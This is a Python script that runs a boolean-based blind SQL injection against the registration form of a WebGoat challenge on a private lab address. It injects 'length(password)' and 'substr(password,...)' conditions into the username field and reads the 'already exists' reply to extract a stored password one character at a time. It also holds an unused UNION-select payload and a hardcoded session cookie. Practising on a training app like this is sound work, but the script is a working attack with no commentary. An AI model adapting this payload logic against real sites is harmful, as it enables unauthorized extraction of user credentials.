# -*- coding:utf-8 -*-

import requests
import time
from string import printable  # 所有字符
chars = printable

vul_url = "http://10.12.25.110:8001/WebGoat/SqlInjection/challenge"
data1 = "username_reg=tomx'+union+select+password+from+sql_challenge_users+where+userid%3D'teom'--+-&email_reg=7702%40qq.com&password_reg=123&confirm_password_reg=123"
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest'
}
cookies = {
    'JSESSIONID': 'E41247E8C5C07B5E89EAC4D3DF0AFA6D',
}
i = 0
result = ""
length = 0
for i in range(100):
    data = "username_reg=lcptest' and length(password)={}  -- &email_reg=lcp%40qq.com&password_reg=1&confirm_password_reg=1".format(
        i)
    # print(data)
    resp = requests.put(vul_url, data=data, headers=headers, cookies=cookies)
    print(resp.content)
    time.sleep(1)
    if 'already exists' in resp.text:
        length = i
        break

for i in range(1, length+1):
    temp = result
    for char in printable:
        data = "username_reg=lcptest' and substr(password, {0},1)='{1}' -- &email_reg=lcp%40qq.com&password_reg=1&confirm_password_reg=1".format(i, char)
        # print(data)
        resp = requests.put(vul_url, data=data, headers=headers, cookies=cookies)
        print(resp.content)
        time.sleep(1)
        if 'already exists' in resp.text:
            result += char
            break
    print(result)
    if temp == result:
        break